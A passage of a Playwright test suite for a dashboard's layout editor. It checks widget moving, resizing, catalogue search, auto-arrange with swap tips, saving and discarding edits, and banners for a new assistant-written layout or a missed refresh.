    await page.click(".edit-bar >> text=Done");
    expect(await tiles(page)).toEqual([]);
    expect(await page.textContent(".board-empty")).toContain("no widgets");
  });

  it("moves a widget with the keyboard from its grip", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.focus("[aria-label='Move Coach notes']");
    await page.keyboard.press("Space");
    expect(await page.textContent("#announce")).toContain("Coach notes picked up, position 1 of 2");
    await page.keyboard.press("ArrowRight");
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
    expect(await focused(page)).toBe("Move Coach notes");
    await page.keyboard.press("Space");
    expect(await page.textContent("#announce")).toBe("Coach notes moved to position 2 of 2");
    expect(await focused(page)).toBe("Move Coach notes");
    // Escape puts a picked tile back, and stays in edit mode
    await page.keyboard.press("Enter");
    await page.keyboard.press("Home");
    expect(await tiles(page)).toEqual(["coachNotes", "x"]);
    await page.keyboard.press("Escape");
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
    expect(await page.$(".edit-bar")).not.toBeNull();
  });

  it("drags a widget: the tile lifts, a slot shows where it lands", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const from = (await page.locator("[aria-label='Move Coach notes']").boundingBox())!;
    await page.mouse.move(from.x + 5, from.y + 5);
    await page.mouse.down();
    const to = (await page.locator("[data-id=x]").boundingBox())!;
    await page.mouse.move(to.x + to.width * 0.75, to.y + to.height / 2, { steps: 8 });
    expect(await page.getAttribute("[data-id=coachNotes]", "class")).toContain("lifted");
    // the slot is after x: where the tile lands
    expect(
      await page.$eval(".tile-slot", (s) => (s.previousElementSibling as HTMLElement).dataset.id),
    ).toBe("x");
    await page.mouse.up();
    expect(await page.$(".tile-slot")).toBeNull();
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
  });

  it("resizes a widget by its handle, snapped to the columns", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const handle = page.locator("[aria-label='Width of Coach notes']");
    expect(await handle.getAttribute("aria-valuenow")).toBe("3");
    const box = (await handle.boundingBox())!;
    const grid = (await page.locator(".grid").boundingBox())!;
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.down();
    // a little more than one column wide
    await page.mouse.move(grid.x + grid.width * 0.4, box.y + box.height / 2, { steps: 6 });
    expect(await page.textContent(".span-badge")).toBe("1 / 3");
    expect(await page.$$eval(".guides > div", (d) => d.length)).toBe(3);
    await page.mouse.up();
    expect(await page.$(".guides")).toBeNull();
    expect(await page.getAttribute("[data-id=coachNotes]", "class")).toContain("span-1");
    // from the keyboard, the handle is a slider
    await handle.focus();
    await page.keyboard.press("ArrowRight");
    expect(await handle.getAttribute("aria-valuenow")).toBe("2");
    expect(await handle.getAttribute("aria-valuetext")).toBe("2 of 3 columns");
    await page.keyboard.press("End");
    expect(await page.getAttribute("[data-id=coachNotes]", "class")).toContain("span-3");
  });

  it("ends a drag when the page draws again during it", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const from = (await page.locator("[aria-label='Move Coach notes']").boundingBox())!;
    await page.mouse.move(from.x + 5, from.y + 5);
    await page.mouse.down();
    const to = (await page.locator("[data-id=x]").boundingBox())!;
    await page.mouse.move(to.x + to.width * 0.75, to.y + to.height / 2, { steps: 8 });
    expect(await page.evaluate(() => document.documentElement.classList.contains("dragging"))).toBe(
      true,
    );
    await page.evaluate(() => window.dispatchEvent(new HashChangeEvent("hashchange")));
    await page.waitForFunction(() => !document.documentElement.classList.contains("dragging"));
    expect(await page.$(".tile-slot")).toBeNull();
    await page.mouse.up();
  });

  it("ends a resize when the page draws again during it", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    const box = (await page.locator("[aria-label='Width of Coach notes']").boundingBox())!;
    const grid = (await page.locator(".grid").boundingBox())!;
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.down();
    await page.mouse.move(grid.x + grid.width * 0.4, box.y + box.height / 2, { steps: 6 });
    expect(await page.evaluate(() => document.documentElement.classList.contains("resizing"))).toBe(
      true,
    );
    await page.evaluate(() => window.dispatchEvent(new HashChangeEvent("hashchange")));
    await page.waitForFunction(() => !document.documentElement.classList.contains("resizing"));
    expect(await page.$(".guides")).toBeNull();
    await page.mouse.up();
  });

  it("keeps a widget at its narrowest width", async () => {
    const { page } = await open(browser, pageFile());
    await startEdit(page);
    const handle = page.locator("[aria-label='Width of Activities']");
    expect(await handle.getAttribute("aria-valuemin")).toBe("2");
    await handle.focus();
    await page.keyboard.press("Home");
    expect(await page.getAttribute("[data-id=activities]", "class")).toContain("span-2");
  });

  it("finds a widget in the catalogue by its title, in the page language or in English", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ layout: two, settings: { languages: ["en", "it"] } }),
      { locale: "it-IT" },
    );
    await page.click(".account summary");
    await page.click(".account-panel >> text=Modifica layout");
    await page.click("[aria-label='Nascondi Note del coach']");
    await page.click(".edit-bar >> text=/Aggiungi widget/");
    expect(await focused(page)).toBe("Cerca widget");
    const shown = () => page.locator(".catalogue li:visible").allTextContents();
    const top = () => page.$eval(".dialog", (d) => d.getBoundingClientRect().top);
    const before = await top();
    // no case, no accents, and the English title works too
    await page.fill(".catalogue-search", "VOLUME SETTIMANALE");
    expect((await shown()).map((x) => x.slice(0, 18))).toEqual(["Volume settimanale"]);
    // a shorter list does not move the dialog under the search box
    expect(await top()).toBe(before);
    await page.fill(".catalogue-search", "coach notes");
    expect((await shown()).join("|")).toMatch(/^Nascosti.*\|Note del coach/);
    await page.fill(".catalogue-search", "zzz");
    expect(await shown()).toEqual(["Nessun widget corrisponde."]);
    await page.fill(".catalogue-search", "");
    expect((await shown()).length).toBeGreaterThan(30);
    expect(errors).toEqual([]);
  });

  it("removes a widget, adds it back from the catalogue, and resets to the preset", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click(".edit-bar >> text=Add widget");
    await page.click("dialog >> text=Remove Coach notes");
    expect(await tiles(page)).toEqual(["x"]);
    expect(await page.textContent(".edit-bar")).not.toContain("hidden");
    await page.click("text=Add widget");
    await page.click(".catalogue li:has-text('Coach notes') button");
    expect(await tiles(page)).toEqual(["x", "coachNotes"]);
    await page.click("text=Reset board");
    await page.click("text=Done");
    expect(await tiles(page)).toEqual(ALL_PRESET);
  });

  it("shows no unsaved changes when Reset runs on an unedited board", async () => {
    const listed = { rev: "r1", base: "preset", boards: { cycling: [] }, seen: { cycling: [] } };
    for (const layout of [null, listed]) {
      const { page, errors } = await open(browser, pageFile({ layout }));
      await startEdit(page);
      await page.click("text=Reset board");
      expect(await page.innerText(".edit-bar")).not.toContain("Unsaved changes");
      expect(errors).toEqual([]);
    }
  });

  describe("Auto-arrange", () => {
    const widgets = [
      tallBox("x", 100),
      tallBox("tall2", 400),
      tallBox("low1", 100),
      tallBox("low2", 100),
      tallBox("tall1", 400),
    ];
    // in one row the stretched tiles all read 400 px; only the content heights pair low with low
    const byHeight = [of("low1", 1), of("low2", 1), of("tall1", 1), of("tall2", 1)];
    const paired = "low1:2 low2:1 tall1:2 tall2:1";

    it("keeps the order and fills the rows, as a draft that Discard undoes and Done saves", async () => {
      const layout = {
        rev: "r1",
        base: "preset",
        seen: { ...MET, running: preset("running").map((i) => i.widget) },
        boards: {
          all: [
            of("activities", 3),
            of("x", 1),
            of("intensityMinutes", 1, { hidden: true }),
            of("records", 3),
            of("kpis", 3),
          ],
          running: [of("activities", 3), of("typeKpis", 3)],
        },
      };
      const { page, errors } = await open(
        browser,
        pageFile({ layout, widgets, settings: { languages: ["en", "it"] } }),
        { locale: "it-IT" },
      );
      const startItalianEdit = async () => {
        await page.click(".account summary");
        await page.click(".account-panel >> text=Modifica layout");
      };
      await startItalianEdit();
      await page.click(".edit-bar >> text=Disponi automaticamente");
      const arranged = "activities:3 x:3 records:3 kpis:3";
      expect(await spans(page)).toBe(arranged);
      expect(await page.textContent("#announce")).toBe("Widget disposti");
      expect(await page.innerText(".edit-bar")).toContain("Modifiche non salvate");
      expect(await saved(page)).toBeNull();

      await page.click(".edit-bar >> text=Annulla");
      await page.click("dialog >> text=Annulla le modifiche");
      expect(await spans(page)).toBe("activities:3 x:1 records:3 kpis:3");

      await startItalianEdit();
      await page.click(".edit-bar >> text=Disponi automaticamente");
      await page.click(".edit-bar >> text=Fine");
      expect(await spans(page)).toBe(arranged);
      const { boards } = JSON.parse((await saved(page))!).layout;
      expect(boards.all).toEqual([
        of("activities", 3),
        of("x", 3, { baseSpan: 1 }),
        of("intensityMinutes", 1, { hidden: true }),
        of("records", 3),
        of("kpis", 3),
      ]);
      expect(boards.running).toEqual(layout.boards.running);
      expect(errors).toEqual([]);
    });

    it("splits the rows by the height of their content, not of the stretched tile", async () => {
      const { page } = await open(browser, pageFile({ layout: onAll(byHeight), widgets }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe(paired);
    });

    it("counts a widget's narrowest width", async () => {
      const board = [of("calendar", 1), of("fitnessAge", 1), of("periodComparison", 1)];
      const { page } = await open(browser, pageFile({ layout: onAll(board) }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await tiles(page)).toEqual(["calendar", "fitnessAge", "periodComparison"]);
      const widths = await page.$$eval(".tile", (els) => els.map((e) => e.className));
      expect(widths.map((c) => c.match(/span-\d/)?.[0]).toSorted()).toEqual([
        "span-1",
        "span-2",
        "span-3",
      ]);
    });

    it("shows no unsaved changes on a board that is already arranged", async () => {
      const boards = [[of("x", 3)], [], [of("x", 1, { hidden: true })]].map(onAll);
      for (const layout of [null, ...boards]) {
        const { page, errors } = await open(browser, pageFile({ layout, widgets }));
        await startEdit(page);
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await page.textContent("#announce")).toBe("Widgets arranged");
        expect(await page.innerText(".edit-bar")).not.toContain("Unsaved changes");
        expect(errors).toEqual([]);
      }
    });

    it("gives a withheld or hidden widget no column, and keeps it in its place", async () => {
      const board = [of("gone", 3), of("readiness", 2), of("hrv", 1, { hidden: true }), of("x", 1)];
      const { page, errors } = await open(
        browser,
        pageFile({ layout: onAll(board), widgets, settings: { exclude: ["recovery"] } }),
      );
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe("gone:3 x:3");
      await page.click(".edit-bar >> text=Done");
      const { boards } = JSON.parse((await saved(page))!).layout;
      expect(boards.all).toEqual([
        of("gone", 3),
        of("readiness", 2),
        of("hrv", 1, { hidden: true }),
        of("x", 3, { baseSpan: 1 }),
      ]);
      expect(errors).toEqual([]);
    });

    it("gives the same board on a second press", async () => {
      const board = [of("low1", 1), of("tall2", 2), of("tall1", 1), of("x", 1), of("low2", 2)];
      const { page } = await open(browser, pageFile({ layout: onAll(board), widgets }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      const once = await spans(page);
      expect(once).not.toBe("low1:1 tall2:2 tall1:1 x:1 low2:2");
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe(once);
    });

    it("gives the same board on a second press when a wider tile gets shorter", async () => {
      // nine boxes in 3 rows at width 1, in 2 rows at width 2
      const wraps = custom(
        "wraps",
        `el.innerHTML = '<div style="display:inline-block;width:100px;height:130px"></div>'.repeat(9);`,
      );
      const board = [of("wraps", 1), of("top", 1), of("low", 1), of("wide", 1)];
      const { page } = await open(
        browser,
        pageFile({
          layout: onAll(board),
          widgets: [tallBox("wide", 300), tallBox("top", 380), tallBox("low", 250), wraps],
        }),
        { viewport: { width: 1280, height: 800 } },
      );
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      const once = await spans(page);
      expect(once).toBe("wraps:2 top:1 low:1 wide:2");
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe(once);
    });

    it("draws the board once, also with a tile whose height changes on each draw", async () => {
      const flips = custom(
        "flips",
        `window.draws = (window.draws ?? 0) + 1;
         el.innerHTML = '<div style="height:' + (window.draws % 2 ? 400 : 100) + 'px"></div>';`,
      );
      const board = [of("flips", 1), of("top", 1), of("steady", 1), of("low", 1)];
      const { page, errors } = await open(
        browser,
        pageFile({
          layout: onAll(board),
          widgets: [tallBox("steady", 250), tallBox("top", 400), tallBox("low", 100), flips],
        }),
      );
      await startEdit(page);
      const draws = () => page.evaluate(() => (window as unknown as { draws: number }).draws);
      const before = await draws();
      await page.click(".edit-bar >> text=Auto-arrange");
      expect((await draws()) - before).toBe(1);
      const once = await spans(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe(once);
      expect(errors).toEqual([]);
    });

    it("keeps keyboard focus on the button when the board changes", async () => {
      const { page } = await open(
        browser,
        pageFile({ layout: onAll([of("x", 1), of("kpis", 3)]), widgets }),
      );
      await startEdit(page);
      await page.focus(".edit-bar >> text=Auto-arrange");
      await page.keyboard.press("Enter");
      expect(await spans(page)).toBe("x:3 kpis:3");
      expect(await page.evaluate(() => document.activeElement?.textContent)).toBe("Auto-arrange");
    });

    it("reads the height of an instance by its own id, also with a quote in it", async () => {
      const board = [of("low1", 1), of("low2", 1), { id: 'tall"1', widget: "tall1", span: 1 }];
      const { page, errors } = await open(
        browser,
        pageFile({ layout: onAll([...board, of("tall2", 1)]), widgets }),
      );
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe('low1:2 low2:1 tall"1:2 tall2:1');
      expect(errors).toEqual([]);
    });

    it("suggests a swap that evens out the rows, and Swap applies it", async () => {
      const board = [of("low1", 1), of("tall1", 1), of("low2", 1), of("tall2", 1)];
      const { page, errors } = await open(browser, pageFile({ layout: onAll(board), widgets }));
      await startEdit(page);
      expect(await page.$(".edit-tip")).toBeNull();
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe("low1:1 tall1:1 low2:1 tall2:3");
      const tipText = "Tip: swap Custom tall1 and Custom low2 to even out the rows.";
      expect(await page.innerText(".edit-tip")).toContain(tipText);
      expect(await page.textContent("#announce")).toBe(`Widgets arranged. ${tipText}`);
      expect(await page.innerText(".edit-tip button")).toBe("Swap");

      await page.click(".edit-tip button");
      expect(await spans(page)).toBe(paired);
      expect(await page.$(".edit-tip")).toBeNull();
      expect(await page.textContent("#announce")).toBe("Custom tall1 and Custom low2 swapped");
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await page.$(".edit-tip")).toBeNull();
      expect(errors).toEqual([]);
    });

    it("shows a tip on a board that is already arranged, with no unsaved changes", async () => {
      const board = [of("low1", 1), of("tall1", 2), of("low2", 2), of("tall2", 1)];
      const { page, errors } = await open(browser, pageFile({ layout: onAll(board), widgets }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe("low1:1 tall1:2 low2:2 tall2:1");
      expect(await page.innerText(".edit-bar")).not.toContain("Unsaved changes");
      expect(await page.innerText(".edit-tip")).toContain("swap Custom tall1 and Custom low2");
      await page.click(".edit-tip button");
      expect(await spans(page)).toBe("low1:1 low2:2 tall1:2 tall2:1");
      expect(await page.innerText(".edit-bar")).toContain("Unsaved changes");
      expect(errors).toEqual([]);
    });

    it("drops the tip on another edit and on a press that finds none", async () => {
      const board = [of("low1", 1), of("tall1", 1), of("low2", 1), of("tall2", 1)];
      const { page, errors } = await open(browser, pageFile({ layout: onAll(board), widgets }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      await page.click(".edit-bar >> text=Reset board");
      expect(await page.$(".edit-tip")).toBeNull();

      await page.click(".edit-bar >> text=Discard");
      await page.click("dialog >> text=Discard changes");
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      await page.click(".edit-tip button");
      await page.click(".edit-bar >> text=Discard");
      await page.click("dialog >> text=Discard changes");
      await startEdit(page);
      expect(await page.$(".edit-tip")).toBeNull();
      expect(errors).toEqual([]);
    });

    it("drops the tip when edit mode ends", async () => {
      const board = [of("low1", 1), of("tall1", 2), of("low2", 2), of("tall2", 1)];
      const { page, errors } = await open(browser, pageFile({ layout: onAll(board), widgets }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await page.$(".edit-tip")).not.toBeNull();
      await page.click(".edit-bar >> text=Discard");
      await startEdit(page);
      expect(await page.$(".edit-tip")).toBeNull();
      expect(errors).toEqual([]);
    });

    it("shows the tip only on the board it is for", async () => {
      const board = [of("low1", 1), of("tall1", 2), of("low2", 2), of("tall2", 1)];
      const layout = { ...onAll(board), boards: { all: board, running: [of("typeKpis", 3)] } };
      const { page, errors } = await open(browser, pageFile({ layout, widgets }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      await page.click("[role=tab][data-tab=running]");
      expect(await page.$(".edit-tip")).toBeNull();
      await page.click("[role=tab][data-tab=all]");
      expect(await page.innerText(".edit-tip")).toContain("swap Custom tall1 and Custom low2");
      expect(errors).toEqual([]);
    });

    it("drops the tip on a press that finds none, with no unsaved changes", async () => {
      const board = [of("low1", 1), of("tall1", 2), of("low2", 2), of("tall2", 1)];
      const { page, errors } = await open(browser, pageFile({ layout: onAll(board), widgets }));
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await page.$(".edit-tip")).not.toBeNull();
      // the tall tiles get as low as the others: no swap evens the rows out any more
      await page.$$eval(".tile[data-id^=tall] .tile-body div", (els) =>
        els.forEach((e) => ((e as HTMLElement).style.height = "100px")),
      );
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await page.$(".edit-tip")).toBeNull();
      expect(await spans(page)).toBe("low1:1 tall1:2 low2:2 tall2:1");
      expect(await page.innerText(".edit-bar")).not.toContain("Unsaved changes");
      expect(errors).toEqual([]);
    });

    it("shows the tip in the page language", async () => {
      const board = [of("low1", 1), of("tall1", 1), of("low2", 1), of("tall2", 1)];
      const { page } = await open(
        browser,
        pageFile({ layout: onAll(board), widgets, settings: { languages: ["en", "it"] } }),
        { locale: "it-IT" },
      );
      await page.click(".account summary");
      await page.click(".account-panel >> text=Modifica layout");
      await page.click(".edit-bar >> text=Disponi automaticamente");
      expect(await page.innerText(".edit-tip")).toContain(
        "Suggerimento: scambia Custom tall1 e Custom low2 per bilanciare le righe.",
      );
      await page.click(".edit-tip button");
      expect(await spans(page)).toBe(paired);
    });

    const pressed = async (board = byHeight, file = {}) => {
      const { page, errors } = await open(
        browser,
        pageFile({ layout: onAll(board), widgets, ...file }),
      );
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      return { page, errors };
    };

    describe("a width that a press added", () => {
      it("goes back on a later press in the same edit session", async () => {
        const { page, errors } = await pressed();
        expect(await spans(page)).toBe(paired);
        await page.click("[aria-label='Hide Custom low2']");
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await spans(page)).toBe("low1:1 tall1:1 tall2:1");
        expect(errors).toEqual([]);
      });

      it("gives way to a width the user sets after the press", async () => {
        const { page, errors } = await pressed();
        // tall1 is 2 wide with the note 1; the user's 3 replaces both
        await page.locator("[aria-label='Width of Custom tall1']").focus();
        await page.keyboard.press("End");
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await spans(page)).toBe("low1:2 low2:1 tall1:3 tall2:3");
        expect(errors).toEqual([]);
      });

      it("still goes back after Done and a reload", async () => {
        const { page, errors } = await pressed();
        await page.click(".edit-bar >> text=Done");
        const { boards } = JSON.parse((await saved(page))!).layout;
        expect(boards.all).toEqual([
          of("low1", 2, { baseSpan: 1 }),
          of("low2", 1),
          of("tall1", 2, { baseSpan: 1 }),
          of("tall2", 1),
        ]);
        await page.reload();
        await startEdit(page);
        await page.click("[aria-label='Hide Custom low2']");
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await spans(page)).toBe("low1:1 tall1:1 tall2:1");
        expect(errors).toEqual([]);
      });

      it("is drawn at the user's width before the heights are measured", async () => {
        // nine boxes in 3 rows at width 1 (as tall as a), in 1 row at width 3 (as low as b and c):
        // measured at 3, wraps would join b and c and leave a alone
        const wraps = custom(
          "wraps",
          `el.innerHTML = '<div style="display:inline-block;width:100px;height:130px"></div>'.repeat(9);`,
        );
        const board = [of("a", 1), of("wraps", 3, { baseSpan: 1 }), of("b", 1), of("c", 1)];
        const { page, errors } = await open(
          browser,
          pageFile({
            layout: onAll(board),
            widgets: [wraps, tallBox("a", 420), tallBox("b", 130), tallBox("c", 130)],
          }),
          { viewport: { width: 1280, height: 800 } },
        );
        await startEdit(page);
        expect(await spans(page)).toBe("a:1 wraps:3 b:1 c:1");
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await spans(page)).toBe("a:2 wraps:1 b:2 c:1");
        expect(errors).toEqual([]);
      });

      it("shows no unsaved changes when the press gives the same widths again", async () => {
        const board = [of("wraps", 3, { baseSpan: 1 })];
        const { page, errors } = await open(
          browser,
          pageFile({ layout: onAll(board), widgets: [tallBox("wraps", 100)] }),
        );
        await startEdit(page);
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await spans(page)).toBe("wraps:3");
        expect(await page.innerText(".edit-bar")).not.toContain("Unsaved changes");
        expect(errors).toEqual([]);
      });

      it("is forgotten by Reset board", async () => {
        // the press keeps calendar at 2; the preset has it at 1, beside readiness at 2
        const { page, errors } = await pressed([of("calendar", 2), of("x", 1)]);
        expect(await spans(page)).toBe("calendar:2 x:1");
        await page.click(".edit-bar >> text=Reset board");
        const reset = await spans(page);
        expect(reset).toContain("readiness:2 calendar:1");
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await spans(page)).toBe(reset);
        expect(errors).toEqual([]);
      });

      it("is forgotten for a removed widget that comes back", async () => {
        const { page, errors } = await pressed([of("records", 1), of("low1", 1), of("low2", 1)]);
        expect(await spans(page)).toBe("records:1 low1:1 low2:1");
        await page.click("[aria-label='Hide Records']");
        await page.click(".edit-bar >> text=Add widget");
        await page.click("dialog >> text=Remove Records");
        await page.click(".edit-bar >> text=Add widget");
        await page.click(".catalogue li:has-text('Records') button");
        expect(await spans(page)).toBe("low1:1 low2:1 records:3");
        await page.click(".edit-bar >> text=Auto-arrange");
        expect(await spans(page)).toBe("low1:2 low2:1 records:3");
        expect(errors).toEqual([]);
      });
    });

    it.each([390, 1000])("splits by height and stays the same at %d px", async (width) => {
      const { page, errors } = await open(browser, pageFile({ layout: onAll(byHeight), widgets }), {
        viewport: { width, height: 844 },
      });
      await startEdit(page);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe(paired);
      await page.click(".edit-bar >> text=Auto-arrange");
      expect(await spans(page)).toBe(paired);
      expect(errors).toEqual([]);
    });
  });

  it("keeps a browser edit after a reload, until the page gets a new layout", async () => {
    const file = pageFile({ layout: two });
    const { page } = await open(browser, file);
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click("text=Done");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toEqual([]);

    // Claude saved another layout into the same page: a new rev, so the page layout wins
    writeFileSync(file, readFileSync(file, "utf8").replace('"rev":"r1"', '"rev":"r2"'));
    await page.reload();
    await page.waitForSelector(".page");
    // the page layout has the notes and a widget that does not exist yet
    expect(await tiles(page)).toEqual(["coachNotes"]);
    // and the page offers the layout of this browser back
    expect(await page.textContent(".banner")).toContain("Your assistant wrote a new layout");
    await page.click(".banner >> text=Keep mine");
    expect(await tiles(page)).toEqual([]);
    expect(await page.$(".banner")).toBeNull();
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toEqual([]);
    expect(await page.$(".banner")).toBeNull();
  });

  it("warns when the automatic refresh is over an hour late, and only then", async () => {
    const missed = (due?: string) =>
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, updated: hours(-26), due } });
    const banner = "[role=region][aria-label='Refresh missed']";

    const late = await open(browser, missed(hours(-2)));
    expect(await late.page.innerText(banner)).toMatch(
      /^The automatic refresh has not updated this page since .*2\d{3}.*ask your assistant/,
    );
    expect(late.errors).toEqual([]);
    // a run that starts after a wake gets an hour; no due means no schedule; a bad due is no due
    for (const due of [hours(-0.5), hours(20), undefined, "soon"]) {
      const { page, errors } = await open(browser, missed(due));
      expect(await page.$(banner)).toBeNull();
      expect(errors).toEqual([]);
    }

    // edit mode hides the note, Done brings it back
    await startEdit(late.page);
    expect(await late.page.$(banner)).toBeNull();
    await late.page.click("text=Done");
    expect(await late.page.$(banner)).not.toBeNull();
  });

  it("dates the late note with the day of an older page, and in the page language", async () => {
    const older = pageFile({
      data: { ...without(data, ["updated"]), v: DASHBOARD_VERSION, due: hours(-2) },
      settings: { languages: ["en", "it"] },
    });
    const en = await open(browser, older, { locale: "en-US" });
    // the fixture was generated on 2026-10-26 and has no time of day
    expect(await en.page.innerText("[role=region][aria-label='Refresh missed']")).toContain(
      "since Oct 26, 2026. The computer",
    );
    const italian = await open(browser, older, { locale: "it-IT" });
    expect(
      await italian.page.innerText("[role=region][aria-label='Aggiornamento saltato']"),
    ).toMatch(/^L'aggiornamento automatico non ha aggiornato questa pagina dal .*26.*2026/);
    expect([...en.errors, ...italian.errors]).toEqual([]);
  });

  it("saves the edits only on Done", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.focus("[aria-label='Move Coach notes']");
    for (const key of ["Space", "ArrowRight", "Space"]) await page.keyboard.press(key);
    expect(await page.textContent(".edit-bar")).toContain("Unsaved changes");
    expect(await saved(page)).toBeNull();
    await page.click(".edit-bar >> text=Done");
    expect(
      JSON.parse((await saved(page))!).layout.boards.all.map((i: { id: string }) => i.id),
    ).toEqual(["x", "coachNotes"]);
    expect(await page.textContent("#announce")).toBe("Layout saved");
    expect(await focused(page)).toBe("Settings");
  });

  it("asks before it discards the edits, and puts the layout back", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click(".edit-bar >> text=Discard");
    await page.click("dialog >> text=Keep editing");
    expect(await tiles(page)).toEqual(["x"]);
    await page.keyboard.press("Escape"); // Escape is Discard too
    await page.click("dialog >> text=Discard changes");
    expect(await page.$(".edit-bar")).toBeNull();
    expect(await tiles(page)).toEqual(["coachNotes"]);
    expect(await saved(page)).toBeNull();
  });

  it("leaves edit mode without a question when nothing changed", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.keyboard.press("Escape");
    expect(await page.$(".edit-bar")).toBeNull();
    expect(await page.$("dialog")).toBeNull();
  });

  it("keeps the edit bar in view while you scroll", async () => {
    const { page } = await open(browser, pageFile());
    await startEdit(page);
    await page.evaluate(() => window.scrollTo(0, 2000));
    const top = await page.$eval(".edit-bar", (el) => el.getBoundingClientRect().top);
    expect(top).toBe(0);
  });

  it("uses the new layout from Claude when you choose it", async () => {
    const file = pageFile({ layout: two });
    const { page } = await open(browser, file);
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click("text=Done");
    writeFileSync(file, readFileSync(file, "utf8").replace('"rev":"r1"', '"rev":"r2"'));
    await page.reload();
    await page.waitForSelector(".page");
    await page.click(".banner >> text=Use the new one");
    expect(await page.$(".banner")).toBeNull();
    expect(await page.textContent("#announce")).toBe("The new layout is in use");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toEqual(["coachNotes"]);
    expect(await page.$(".banner")).toBeNull();
  });

  it("copies the layout as text that Claude can save", async () => {
    const { page } = await open(browser, pageFile({ layout: two }));
    await startEdit(page);
    await page.click("text=Copy layout");
    const text = await page.inputValue(".layout-text");
    expect(JSON.parse(text)).toEqual({ base: "preset", boards: two.boards, seen: MET });
  });

  it("copies the record of the preset widgets that a board met in its first edit", async () => {
    const { page } = await open(browser, pageFile());
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    await page.click("text=Copy layout");
    const copied = JSON.parse(await page.inputValue(".layout-text"));
    expect(copied.seen).toEqual({ all: ALL_PRESET });
    expect(copied.boards.all).toHaveLength(ALL_PRESET.length);
  });

  it("starts empty on a blank layout", async () => {
    const { page } = await open(
      browser,
      pageFile({ layout: { rev: "b", base: "blank", boards: {} } }),
    );
    expect(await tiles(page)).toEqual([]);
    // an empty board has its own way into edit mode
    expect(await page.textContent(".board-empty")).toContain("no widgets");
    await page.click(".board-empty >> text=Edit layout");
    expect(await page.$(".edit-bar")).not.toBeNull();
    expect(await page.textContent(".board-empty")).toContain("Add widget");
  });

  it("opens edit mode from the settings menu, and closes the menu", async () => {
    const { page } = await open(browser, pageFile());
    expect(await page.$(".menus > .btn")).toBeNull();
    await startEdit(page);
    expect(await page.$(".account[open]")).toBeNull();
    expect(await page.$(".account-panel .edit-start")).toBeNull();
    expect(await focused(page)).toBe("Add widget");
  });
});

it("uses only the synthetic fixture", () => {
  expect(data.activities.every((a: { name: string }) => !/\d{5,}/.test(a.name))).toBe(true);
});

/** Clicks legend item `i` of the chart in tile `id`; returns the visible dataset labels. */
async function clickLegend(
  page: Page,
  id: string,
  i: number,
  modifier?: "Shift",
): Promise<string[]> {
  const canvas = page.locator(`[data-id=${id}] canvas`);
  await canvas.scrollIntoViewIfNeeded();
  const box = (await canvas.boundingBox())!;
  const hit = await canvas.evaluate((el, n) => {
    type Box = { left: number; top: number; width: number; height: number };
    // the item boxes are not in the Chart.js types
    const legend = window.Chart!.getChart(el as HTMLCanvasElement)!.legend as unknown as {
      legendHitBoxes: Box[];
    };
    const h = legend.legendHitBoxes[n];
    return { x: h.left + h.width / 2, y: h.top + h.height / 2 };
  }, i);
  if (modifier) await page.keyboard.down(modifier);
  await page.mouse.click(box.x + hit.x, box.y + hit.y);
  if (modifier) await page.keyboard.up(modifier);
